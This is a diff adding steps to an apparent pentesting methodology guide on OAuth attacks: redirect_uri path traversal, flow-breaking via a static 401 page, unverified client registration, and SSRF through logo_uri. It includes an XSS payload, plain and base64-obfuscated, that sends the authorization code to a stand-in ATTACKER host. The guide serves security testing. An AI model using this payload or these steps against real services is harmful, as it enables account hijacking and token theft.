@@ -295,3 +295,178 @@ Start the fuzzing the parameter value using Burp Suite.
 Check the output of the Intruder for any suspicious responses.
 {% endstep %}
 {% endstepper %}
+
+{% stepper %}
+{% step %}
+Redirect flow to the static endpoint on the same domain to break it.
+{% endstep %}
+
+{% step %}
+The attacker could use the static endpoint within the application to break the execution flow. Then, prevent the application from consuming the single-use Authorization Code.Then, chain it with an XSS vulnerability found in any endpoint across the application to leak the Authorization Code.
+{% endstep %}
+
+{% step %}
+Identify that the application allows redirecting the user to other paths on the same domain.
+{% endstep %}
+
+{% step %}
+Try exploiting the XSS vulnerability on one of these endpoints.
+{% endstep %}
+
+{% step %}
+If it does not work, search for a static endpoint (401.html) which should break the OAuth flow
+
+```http
+EXAMPLE OF A REQUEST:
+GET /OAuth/auth?client_id=1234&redirect_uri=https://target.com/401.html HTTP/1.1
+```
+{% endstep %}
+
+{% step %}
+Use the XSS on the other endpoint with the below content, to break the flow and leak the access key:
+
+```javascript
+javascript:x=window.open("https://TARGET/callback?redirectUrl=https://TARGET/401.html");setTimeout(function() {document.location="http://ATTACKER/?c="+x.location;},5000);
+```
+{% endstep %}
+
+{% step %}
+Example of an XSS payload to exploit the issue: (Credits to [Dawid](https://github.com/mackeysec) from [AFINE](https://afine.pl/) for finding this)
+
+```javascript
+<img src=x onerror=location=atob`amF2YXNjcmlwdDp4PXdpbmRvdy5vcGVuKCJodHRwczovL1RBUkdFVC9jYWxsYmFjaz9yZWRpcmVjdFVybD1odHRwczovL1RBUkdFVC80MDEuaHRtbCIpO3NldFRpbWVvdXQoZnVuY3Rpb24oKXtkb2N1bWVudC5sb2NhdGlvbj0naHR0cDovL0FUVEFDS0VSLz9jPScreC5sb2NhdGlvbjt9LDUwMDApOw==`>
+```
+{% endstep %}
+
+{% step %}
+Require client applications to register a whitelist of valid <sub>redirect\_uris</sub>. Use strict byte-to-byte comparison to validate the URI. Allow complete and exact matches.
+{% endstep %}
+{% endstepper %}
+
+{% stepper %}
+{% step %}
+Redirect flow to the endpoint on the same domain using path traversal. The attacker could use the vulnerability on the other endpoint within the application and the new path as a proxy page to steal a victim's Access Token, thus hijacking his account.
+{% endstep %}
+
+{% step %}
+Turn ON the interception.
+{% endstep %}
+
+{% step %}
+Initiate the OAuth process.
+{% endstep %}
+
+{% step %}
+Send the request with the <sub>redirect\_uri</sub> parameter to the repeater.
+
+```http
+EXAMPLE OF A REQUEST:
+GET /OAuth/auth?client_id=1234&redirect_uri=https://target.com/callback HTTP/1.1
+Host: afine.com
+```
+{% endstep %}
+
+{% step %}
+Change the path using PATH TRAVERSAL to redirect the flow to another endpoint
+
+```http
+EXAMPLE OF A REQUEST:
+GET /OAuth/auth?client_id=1234&redirect_uri=https://target.com/callback/../vuln HTTP/1.1
+```
+{% endstep %}
+
+{% step %}
+If it is possible to redirect the user to another endpoint (/vuln), there is a vulnerability FUZZING PATH TRAVERSAL Check the other PATH TRAVERSAL bypasses using the TRAVERSAL\_DIR\_ONLY wordlist.
+{% endstep %}
+{% endstepper %}
+
+{% stepper %}
+{% step %}
+Check if it is possible to register your client application. Discover the OpenID client registration endpoint: Using the configuration file <sub>/.well-known/openid-configuration</sub> By the directory brute-forcing (dir\_wordlist)
+{% endstep %}
+
+{% step %}
+Fuzz the POST body to find proper parameters - a good start is to use just:
+
+```json
+EXAMPLE OF A VALID POST REQUEST:
+POST /client_register HTTP/1.1
+Host: oauth.afine.com
+Content-Type: application/json
+
+{"redirect_uris": ["https://WHITELISTED.COM/callback"]}
+```
+{% endstep %}
+
+{% step %}
+If you get the 200 OK response with a <sub>CLIENT\_ID</sub> in the body, it is likely vulnerable.&#x20;
+
+> The OpenID provider should require the client application to authenticate itself. For instance, use an HTTP bearer token.
+{% endstep %}
+{% endstepper %}
+
+{% stepper %}
+{% step %}
+Find the OpenID registration endpoint and check for SSRF.&#x20;
+
+```json
+EXAMPLE OF A VALID POST REQUEST:
+POST /client_register HTTP/1.1
+Host: oauth.afine.com
+Content-Type: application/json
+{"redirect_uris": ["https://WHITELISTED.COM/callback"]}
+```
+{% endstep %}
+
+{% step %}
+Use a private collaborator in place of the WHITELISTED.COM domain to check for SSRF vulnerability.&#x20;
+{% endstep %}
+
+{% step %}
+Fuzz the POST body to discover more URI parameters (see the PortSwigger example below)
+{% endstep %}
+
+{% step %}
+Fuzz the URI parameters values using SSRF wordlist and the one generated with crimson\_redirector.py.
+{% endstep %}
+
+{% step %}
+After discovering <sub>UNVERIFIED CLIENT REGISTRATION</sub>, inject domain collaborator in every URI-like parameter value.
+
+```http
+POST /client_register HTTP/1.1
+Host: target
+Content-Type: application/json
+{
+  "redirect_uris": ["https://TARGET/callback"],
+  "jwks_uri": "https://jwks.afine.com/my_public_keys_jwks",
+  "logo_uri": "https://logo.afine.com/logo.png"
+}
+```
+{% endstep %}
+
+{% step %}
+Find a way to trigger the server somehow to use these URLs.
+{% endstep %}
+
+{% step %}
+One way is to use the <sub>CLIENT\_ID</sub> parameter value from the server response after registering the client.
+{% endstep %}
+
+{% step %}
+Find the endpoint that fetches the logo (it should be one of the endpoints used during OAuth flow).
+{% endstep %}
+
+{% step %}
+Use the <sub>CLIENT\_ID</sub> to trigger the server interaction.
+
+```http
+EXAMPLE REQUEST:
+GET /client/CLIENT_ID/logo HTTP/1.1
+```
+{% endstep %}
+
+{% step %}
+Observe the <sub>DNS/HTTP</sub> out-of-bound interactions in your collaborator server
+{% endstep %}
+{% endstepper %}
